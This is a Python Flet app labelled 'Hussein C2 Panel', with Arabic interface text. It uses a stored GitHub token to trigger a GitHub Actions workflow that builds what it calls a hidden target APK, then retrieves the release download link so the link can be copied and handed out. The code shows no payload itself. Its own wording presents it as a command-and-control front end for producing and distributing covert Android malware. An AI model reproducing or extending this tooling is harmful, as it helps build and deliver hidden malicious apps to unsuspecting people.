import flet as ft
import requests

def main(page: ft.Page):
    page.title = "Hussein C2 Panel"
    page.theme_mode = ft.ThemeMode.DARK
    page.rtl = True
    page.window_width = 400
    page.window_height = 700
    page.padding = 20

    # جلب البيانات المحفوظة سابقاً (احترافية)
    saved_token = page.client_storage.get("gh_token") or ""
    saved_user = page.client_storage.get("gh_user") or ""
    saved_repo = page.client_storage.get("gh_repo") or ""

    # الحقول
    gh_token = ft.TextField(label="توكن جيثب (PAT)", value=saved_token, password=True, can_reveal_password=True, prefix_icon=ft.Icons.SECURITY)
    gh_user = ft.TextField(label="اسم المستخدم في جيثب", value=saved_user, prefix_icon=ft.Icons.PERSON)
    gh_repo = ft.TextField(label="اسم المستودع", value=saved_repo, prefix_icon=ft.Icons.FOLDER)

    status_text = ft.Text("الحالة: جاهز لإرسال الأوامر 🟢", color="blue", size=14, weight="bold")
    link_text = ft.TextField(label="رابط التطبيق المستهدف (APK)", read_only=True, visible=False, suffix_icon=ft.Icons.COPY)

    def save_data():
        page.client_storage.set("gh_token", gh_token.value)
        page.client_storage.set("gh_user", gh_user.value)
        page.client_storage.set("gh_repo", gh_repo.value)

    def trigger_build(e):
        if not gh_token.value or not gh_user.value or not gh_repo.value:
            status_text.value = "⚠️ الرجاء ملء جميع الحقول!"
            status_text.color = "red"
            page.update()
            return

        save_data() # حفظ البيانات للمرات القادمة
        
        headers = {
            "Accept": "application/vnd.github.v3+json",
            "Authorization": f"token {gh_token.value}"
        }
        url = f"https://api.github.com/repos/{gh_user.value}/{gh_repo.value}/actions/workflows/main.yml/dispatches"
        data = {"ref": "main"}
        
        status_text.value = "⏳ جاري إرسال أمر التصنيع للسيرفر..."
        status_text.color = "orange"
        link_text.visible = False
        page.update()
        
        try:
            res = requests.post(url, headers=headers, json=data)
            if res.status_code == 204:
                status_text.value = "✅ السيرفر استلم الأمر! جاري صناعة التطبيق المخفي (انتظر دقيقتين)."
                status_text.color = "green"
            else:
                status_text.value = f"❌ خطأ: السيرفر رفض الأمر. تأكد من التوكن."
                status_text.color = "red"
        except Exception as ex:
            status_text.value = "❌ خطأ في الاتصال بالإنترنت!"
            status_text.color = "red"
        page.update()

    def get_link(e):
        headers = {
            "Accept": "application/vnd.github.v3+json",
            "Authorization": f"token {gh_token.value}"
        }
        url = f"https://api.github.com/repos/{gh_user.value}/{gh_repo.value}/releases/latest"
        status_text.value = "🔍 جاري البحث عن التطبيق في السيرفر..."
        status_text.color = "orange"
        page.update()
        
        try:
            res = requests.get(url, headers=headers)
            if res.status_code == 200:
                data = res.json()
                assets = data.get("assets", [])
                if assets:
                    link_text.value = assets[0]["browser_download_url"]
                    link_text.visible = True
                    status_text.value = "🎉 تم العثور على التطبيق! انسخ الرابط:"
                    status_text.color = "green"
                else:
                    status_text.value = "⚠️ التطبيق قيد الصناعة، حاول بعد قليل."
                    status_text.color = "yellow"
            else:
                status_text.value = "❌ التطبيق لم يجهز بعد."
                status_text.color = "red"
        except Exception as ex:
            status_text.value = "❌ خطأ في الاتصال!"
            status_text.color = "red"
        page.update()

    page.add(
        ft.Row([ft.Icon(ft.Icons.ADMIN_PANEL_SETTINGS, size=40, color="blue"), ft.Text("Hussein C2 Panel", size=28, weight="bold")]),
        ft.Divider(),
        gh_user, gh_repo, gh_token,
        ft.Container(height=10),
        ft.Row([
            ft.ElevatedButton("1. اصنع التطبيق المستهدف 🚀", on_click=trigger_build, bgcolor="red", color="white", expand=True),
        ]),
        ft.Row([
            ft.ElevatedButton("2. جلب رابط التحميل 📥", on_click=get_link, bgcolor="green", color="white", expand=True)
        ]),
        ft.Divider(),
        status_text,
        link_text
    )

ft.app(target=main)
